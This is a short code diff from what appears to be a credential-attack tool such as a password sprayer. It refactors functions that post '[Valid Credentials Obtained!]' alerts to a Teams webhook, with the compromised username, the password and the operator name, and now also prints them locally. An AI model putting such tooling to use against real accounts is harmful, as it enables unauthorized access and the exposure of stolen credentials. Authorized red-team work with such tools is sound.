@@ -234,15 +234,15 @@ def teams_notify(username, password, operator, exclude_password, webhook):
     pwd_insert = f"Pass: {password}\n"
     if exclude_password:
         pwd_insert = ""
-
+    content = ("[Valid Credentials Obtained!]\n"
+            f"{op_insert}"
+            f"User: {username}\n"
+            f"{pwd_insert}"
+            f"Date: {date}\n"
+            f"Time: {time}")
+    print(content)
     response = requests.post(
         url=webhook,
-        content = ("[Valid Credentials Obtained!]\n"
-        f"{op_insert}"
-        f"User: {username}\n"
-        f"{pwd_insert}"
-        f"Date: {date}\n"
-        f"Time: {time}"),
         headers={"Content-Type": "application/json"},
         json={
             "summary": "[Valid Credentials Obtained!]",
@@ -264,13 +264,14 @@ def teams_update(message, operator, webhook):
     if operator is not None:
         op_insert = f"Operator: {operator}\n"
 
-    response = requests.post(
-        url=webhook,
-        content = ("[Log Entry]\n"
+    content = ("[Log Entry]\n"
         f"{op_insert}"
         f"Message: {message}\n"
         f"Date: {date}\n"
-        f"Time: {time}"),
+        f"Time: {time}")
+    print(content)
+    response = requests.post(
+        url=webhook,
         headers={"Content-Type": "application/json"},
         json={
             "summary": "[Log Entry!]",
